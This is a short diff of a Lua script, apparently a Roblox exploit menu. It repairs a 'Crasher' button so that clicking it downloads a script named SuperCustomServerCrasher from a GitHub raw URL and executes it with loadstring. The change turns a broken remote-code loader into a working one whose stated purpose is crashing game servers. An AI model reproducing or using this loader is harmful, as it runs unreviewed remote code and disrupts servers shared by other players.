@@ -132,5 +132,5 @@ main15:NewKeybind(
 end)
 local main15 = main14:NewSection("Crasher")
 main15:NewButton("Starts Crasher", "Loads Server crasher", function()
-loadstring(game:HttpGet("loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
